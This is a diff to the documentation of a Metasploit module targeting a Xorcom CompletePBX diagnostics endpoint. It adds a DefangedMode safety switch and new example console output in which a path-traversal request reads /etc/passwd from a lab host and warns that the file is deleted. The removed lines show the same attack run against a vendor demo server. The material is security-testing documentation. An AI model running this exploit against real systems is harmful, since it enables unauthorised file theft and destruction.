@@ -42,9 +42,21 @@ run
 
 ## Options
 
-- `USERNAME`: Admin username for authentication.
-- `PASSWORD`: Admin password for authentication.
-- `TARGETFILE`: Path of the file to retrieve (**before automatic deletion**).
+### USERNAME
+
+Admin username for authentication.
+
+### PASSWORD
+
+Admin password for authentication.
+
+### TARGETFILE
+
+Path of the file to retrieve (**before automatic deletion**).
+
+### DefangedMode
+
+Safety switch (true by default). Set to **false** to actually perform the read-and-delete operation.
 
 ## Scenarios
 
@@ -58,17 +70,32 @@ run
 **Steps**:
 
 ```bash
-msf6 auxiliary(xorcom_completepbx_diagnostics_file_read) > run https://rnd-repo.cpbxmt-demo187.xorcom.com
-[*] Running module against 142.93.233.32
+msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > run http://192.168.1.32/
+[*] Running module against 192.168.1.32
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[-] Auxiliary aborted due to failure: bad-config: 
+Are you *SURE* you want to execute the module against the target?
+Running this module will attempt to read and delete the file
+specified by TARGETFILE on the remote system.
 
-[*] Attempting authentication with username: admin
-[+] Authentication successful! Session ID: sid=c8f08002130196439747e488447260f48d595c51
-[*] Attempting to read file: ../../../../../../../../../../../etc/passwd
+If you have explicit authorisation, re-run with:
+    set DefangedMode false
+
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > set DefangedMode false
+DefangedMode => false
+msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > run http://192.168.1.32/
+[*] Running module against 192.168.1.32
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[!] This exploit WILL delete the target file if permissions allow.
+[*] Attempting to read file: ../../../../../../../../../../..//etc/passwd
 [*] ZIP file received, attempting to list files
 [*] Files inside ZIP archive:
- - ../../../../../../../../../../../etc/passwd
- - full_20250318_160522
- - audit_20250318_160522.log
+ - ../../../../../../../../../../..//etc/passwd
+ - full_20250716_191240
+ - audit_20250716_191240.log
 [+] Content of /etc/passwd:
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -86,24 +113,24 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
-postfix:x:106:110::/var/spool/postfix:/usr/sbin/nologin
-tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
-sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
-dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-Debian-snmp:x:110:113::/var/lib/snmp:/bin/false
-asterisk:x:111:114:Asterisk PBX daemon,,,:/var/lib/asterisk:/usr/sbin/nologin
-cc-cloud-rec:x:998:998::/var/lib/cc-cloud-rec:/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+pbx:x:1000:1000:,,,:/home/pbx:/bin/bash
+mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
+postfix:x:104:113::/var/spool/postfix:/usr/sbin/nologin
+tcpdump:x:105:115::/nonexistent:/usr/sbin/nologin
+Debian-snmp:x:106:116::/var/lib/snmp:/bin/false
+_chrony:x:107:117:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
+asterisk:x:109:118:Asterisk PBX daemon,,,:/var/lib/asterisk:/usr/sbin/nologin
+cc-cloud-rec:x:999:995::/var/lib/cc-cloud-rec:/sbin/nologin
 
-[!] WARNING: This exploit causes the deletion of the requested file on the target if the privileges allows it.
 [*] Auxiliary module execution completed
 ```
 
